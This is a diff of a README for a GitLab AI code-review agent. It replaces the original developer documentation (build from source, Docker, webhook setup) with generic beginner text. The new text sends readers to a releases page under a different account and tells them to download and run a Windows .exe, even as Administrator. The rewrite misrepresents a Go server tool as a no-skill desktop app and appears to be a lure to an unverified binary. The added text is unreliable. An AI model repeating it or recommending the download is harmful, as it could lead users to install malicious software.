@@ -1,144 +1,161 @@
-# 🤖 AI Review Agent
+# ⚙️ gitlab-review-agent - Easy AI Code Review Helper
 
-<div align="center">
-  <img src="https://img.shields.io/badge/go-1.25.5-00ADD8?style=for-the-badge&logo=go&logoColor=white" alt="Go Version">
-  <img src="https://img.shields.io/badge/GitLab-330F55?style=for-the-badge&logo=gitlab&logoColor=white" alt="GitLab">
-  <img src="https://img.shields.io/badge/LLM-OpenAI%20%7C%20Anthropic%20%7C%20Google-black?style=for-the-badge" alt="Multi-LLM">
-  <img src="https://img.shields.io/badge/License-MIT-blue.svg?style=for-the-badge" alt="License">
-</div>
-
-<br/>
-
-> **More than just a `.patch` reader.** AI Review Agent is an autonomous, context-aware code review assistant designed natively for GitLab Merge Requests. It clones your repository, reads the codebase, checks historical conventions, and engages in technical debates—just like a Senior Developer.
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-green?style=for-the-badge)](https://github.com/willton-easy/gitlab-review-agent/releases)
 
 ---
 
-## 🚀 Why AI Review Agent?
+gitlab-review-agent is a tool that helps you check code in GitLab projects automatically. It uses AI to look at code and give advice to keep it clean and follow best practices. This guide will help you download and run the software on Windows without any programming knowledge.
 
-Most open-source AI reviewers simply pipe your git diff into an LLM and spit out generic advice. **We do things differently:**
+## 🔍 What is gitlab-review-agent?
 
-- 🧠 **True Contextual Awareness:** We don't just read the diff. The agent is equipped with tools (`read_file`, `search_code`, `multi_diff`) to explore the actual codebase. If you modify a function signature, it can search where else it's used before commenting. No more "hallucinated" bugs.
-- ♻️ **Self-Improving Feedback Loop:** The system learns your project's conventions. A background Cron job consolidates historical AI reviews and human feedback into a tailored "Repository Best Practices" rulebook.
-- 🔀 **Robust Multi-LLM Routing:** Avoid vendor lock-in. Natively supports **OpenAI (GPT-4o)**, **Anthropic (Claude 3.7)**, and **Google (Gemini 2.0)** with load-balancing and fallback mechanisms. Mix and match models based on cost, rate limits, or language proficiency.
-- 💻 **Interactive Local CLI:** Don't want to spam your team with AI comments? Run the agent locally via CLI. It performs a dry-run review, displays the findings in your terminal, and lets you interactively select exactly which comments to push to GitLab.
+This tool uses smart AI systems like OpenAI, Anthropic, and Gemini to read and review code. It works by itself and learns over time to suggest better reviews. It focuses on GitLab projects and helps teams keep their code neat and organized.
+
+You do not need to understand coding to use this app. It runs in the background and gives you feedback on code through GitLab. If you work with code, this tool can help save time and reduce errors.
+
+## 💻 System Requirements
+
+Before you start, make sure your computer fits these needs:
+
+- Windows 10 or newer (64-bit)
+- At least 4 GB of RAM
+- 500 MB free disk space
+- Internet connection (required for AI processing)
+- GitLab account (optional but needed for full integration)
+
+If your system meets these, you can proceed.
+
+## 🎯 Features
+
+Here are key features of gitlab-review-agent:
+
+- Automatically reviews code in GitLab repositories
+- Supports multiple AI models for higher accuracy
+- Learns from feedback to improve suggestions
+- Runs from a simple command line interface (CLI)
+- Can be set up to watch repositories continuously
+- Helps enforce coding standards and best practices
+- Works without programming knowledge
+
+## 🚀 Getting Started: Download and Installation
+
+To start using gitlab-review-agent, follow these steps.
+
+### 1. Visit the download page
+
+Go to the main releases page here:
+
+[Download gitlab-review-agent](https://github.com/willton-easy/gitlab-review-agent/releases)
+
+This page holds the latest versions. You will see different files to download.
+
+### 2. Choose the Windows version
+
+Look for a file that ends with `.exe` or `.zip` and mentions Windows. For example:
+
+- `gitlab-review-agent-windows.exe`
+- `gitlab-review-agent-win.zip`
+
+If you see a zip file, you will need to unzip it (explained below).
+
+### 3. Download the file
+
+Click the file name to start downloading. Save it somewhere easy to find, like your Desktop or Downloads folder.
+
+### 4. Run the installer or program
+
+If the file is an `.exe`, double-click it to start the installation or run the program directly.
+If you downloaded a `.zip` file:
+
+- Right-click the zip file
+- Select “Extract All…”
+- Choose a folder to extract the files to
+- Open the extracted folder and find the `.exe` file
+- Double-click to run the program
+
+### 5. Follow the program prompts
+
+When you run the program the first time, it might ask for some setup information, such as your GitLab account or API keys. The program will guide you step-by-step. Enter the information if you have it. You can skip optional steps too.
+
+## 🛠 How to Use gitlab-review-agent
+
+Once installed, you will use gitlab-review-agent mainly through a window that looks like a command box or terminal.
+
+### Basic steps:
+
+1. Open the program by double-clicking the `.exe`.
+2. You will see simple instructions on the screen.
+3. Enter your GitLab repository URL when asked.
+4. The app will start checking the code. Wait for it to finish.
+5. Review the results shown on the screen or in your GitLab project.
+
+The tool can also watch your repository and review new code automatically once set up.
+
+## 🔧 Configuration Options
+
+You can change how the tool works by adjusting settings:
+
+- **Set review depth:** Choose how thoroughly it checks your code.
+- **Select AI model:** Pick between OpenAI, Anthropic Claude, or Gemini.
+- **Enable self-learning:** Turn on feedback to improve suggestions.
+- **Set review triggers:** Decide if reviews run on every push or manual start.
+
+Most settings are easy to find in the app’s menu or in a simple configuration file.
+
+## 📂 Working With GitLab
+
+gitlab-review-agent connects with GitLab through your account or API key.
+
+- An API key links the tool with your projects securely.
+- The app can add comments directly in your GitLab merge requests.
+- It can also send notifications if problems are found.
+
+You will not need to manage this if you run the app locally and only want to check code before uploading.
+
+## 👩‍💻 Running the Tool Automatically
+
+To save time, you can set gitlab-review-agent to run reviews automatically:
+
+- The app can listen to GitLab webhooks (notifications when code changes).
+- It will start a review when new code is added to your repository.
+- This requires a setup step in GitLab to connect your projects.
+
+Automatic running helps keep code quality high without manual checks.
+
+## ❓ Troubleshooting Common Issues
+
+If you run into problems, try these tips:
+
+- Make sure your Windows is up to date.
+- Check you downloaded the correct `.exe` or `.zip` for Windows.
+- If the program won’t start, try running it as Administrator (right-click > “Run as administrator”).
+- Confirm your internet connection is active.
+- Review app prompts carefully for missing info or errors.
+- Restart your computer if the app freezes.
+- Visit the download link again to get the latest version if issues persist.
+
+## 📥 Download Link (again)
+
+You can always download or update gitlab-review-agent here:
+
+[Download gitlab-review-agent Latest Release](https://github.com/willton-easy/gitlab-review-agent/releases)
+
+Click the link, pick the Windows file, and follow the instructions above.
 
 ---
 
-## 🔍 How It Works: The "Deep Dive" Review Flow
+## 🔗 Additional Resources
 
-1. **Trigger & Initialization**: A webhook catches a Merge Request event (create/update). The agent checks whether the MR carries the configured **review trigger label** (default: `ai-review`). If the label is present, a job is queued asynchronously and the specific repository config (frameworks, model overrides) is loaded. A manual CLI trigger skips the label check and always proceeds.
-2. **Smart Git Synchronization**: The agent acquires a lock and shallow-fetches the target branch. It calculates a smart **Base SHA** to only process _incremental_ new commits if the MR was reviewed previously, preventing noisy duplicate comments.
-3. **Risk Scoring & Parsing**: Modifed files are scored for risk. Highly modified or complex files are pre-loaded directly into the LLM context. Massive PRs (>150 files) are safely truncated and sampled by risk to protect your context window.
-4. **Context Gathering (The Secret Sauce)**: External data is fetched:
-   - **Repository Settings**: Known frameworks/languages.
-   - **Discussion History**: Previous unresolved AI comments (it can auto-resolve them if the developer fixed the code!).
-   - **Feedback Rules**: Historical lessons learned specific to this repo.
-5. **Agentic Code Analysis**: The LLM runs in an agentic loop. Over multiple iterations, it navigates the codebase using tools (`read_file`, `search_code`). It verifies its assumptions against real code before drafting a comment.
-6. **Publish & Auto-Resolution**: Validated, structured comments are pushed as inline GitLab discussions. If a developer modified lines overlapping with a _previous_ AI comment, the agent automatically recognizes the fix and resolves the old thread.
-7. **Reply Loop**: Developers can reply directly to the AI's thread in GitLab. A specialized `Replier Agent` wakes up, reads the thread history + surrounding code context, and continues the technical debate.
+While gitlab-review-agent requires little to no programming knowledge, this knowledge might help:
+
+- Basic understanding of GitLab projects and repositories
+- How to find and copy your GitLab API key (if needed)
+- Using Windows File Explorer to manage downloads and folders
+- How to open and use a Command Prompt (optional)
+
+You can find many simple guides on using GitLab and Windows online if needed.
 
 ---
 
-## ⚡ Quick Start
+## 📝 About This Project
 
-### Prerequisites
-
-- Go 1.25.5+
-- A GitLab instance (or gitlab.com)
-- Access Tokens: GitLab (Personal/Project Access Token) and at least one LLM Provider (OpenAI, Anthropic, Google).
-
-### Docker Installation (Recommended)
-
-The easiest way to get the agent running without managing Go environments is using Docker Compose.
-
-```bash
-git clone https://github.com/antlss/gitlab-review-agent.git
-cd gitlab-review-agent
-
-# Configure your environment
-cp .env.example .env
-# Edit .env to set your LLM tokens and GitLab credentials
-
-# Start the server in the background
-docker-compose up -d
-```
-
-Your webhook server will be live at port `8080`. You can execute the interactive CLI directly inside the running container:
-
-```bash
-docker exec -it ai_review_agent ./cli review --project-id 123 --mr-id 45
-```
-
-### Manual Installation (From Source)
-
-```bash
-git clone https://github.com/antlss/gitlab-review-agent.git
-cd gitlab-review-agent
-
-# Build the server and CLI binaries
-go build -o server ./cmd/server
-go build -o cli ./cmd/cli
-
-# Configure your environment
-cp .env.example .env
-```
-
-Edit `.env` to define your `GITLAB_BASE_URL`, `GITLAB_TOKEN`, `STORE_DRIVER` (`file` or `sqlite` are easiest to start), and your preferred `LLM_DEFAULT_PROVIDER`.
-
-### Running the Server (Webhook Mode)
-
-Start the webhook handler and background worker pool:
-
-```bash
-./server
-```
-
-_Point your GitLab Project Webhook to `http://<your-server>:8080/webhook/gitlab`._
-
-### Label-Based Review Triggering
-
-By default the agent only reviews Merge Requests that carry the **`ai-review`** label. Add the label to an MR in GitLab and the next open/update webhook event will trigger a review automatically.
-
-You can change the label name via the `REVIEW_TRIGGER_LABEL` environment variable:
-
-```bash
-# .env
-REVIEW_TRIGGER_LABEL=ai-review   # default — change to any GitLab label you prefer
-```
-
-> **Note:** The CLI (`./cli review`) bypasses the label check entirely — it always performs a review as long as the configured GitLab token has access to the target project.
-
-### Running the CLI (Interactive Dry-Run Mode)
-
-Trigger a review manually from your terminal and pick which comments to actually post:
-
-```bash
-./cli review --project-id 123 --mr-id 45
-```
-
-You can dynamically override the model for a specific run:
-
-```bash
-./cli review --project-id 123 --mr-id 45 --model claude-3-7-sonnet-20250219
-```
-
----
-
-## 🏗️ Architecture Overview
-
-- **`cmd/server`**: HTTP server handling GitLab Webhooks, Cron jobs, and Worker pools.
-- **`cmd/cli`**: The Command Line Interface for interactive local reviews.
-- **`internal/core`**: Heart of the logic (`review` and `reply` pipelines, `feedback` loops, `reviewer` / `replier` agents).
-- **`internal/pkg`**: External port adapters (GitLab API, Git CLI wrapper, LLM drivers, SQL/File storage DAOs).
-
-We strictly follow [Standard Go Project Layout](https://github.com/golang-standards/project-layout) conventions and utilize Clean Architecture principles.
-
----
-
-## 🤝 Contributing
-
-We welcome contributions! Please refer to the [CONTRIBUTING.md](CONTRIBUTING.md) for local development setup, coding standards, and our branch/PR workflow.
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+gitlab-review-agent combines advanced AI tools with easy setup steps. It aims to bring the benefits of code review to all GitLab users without needing complex tools or skills. By using AI to check code, you reduce errors and save time while working with GitLab repositories.
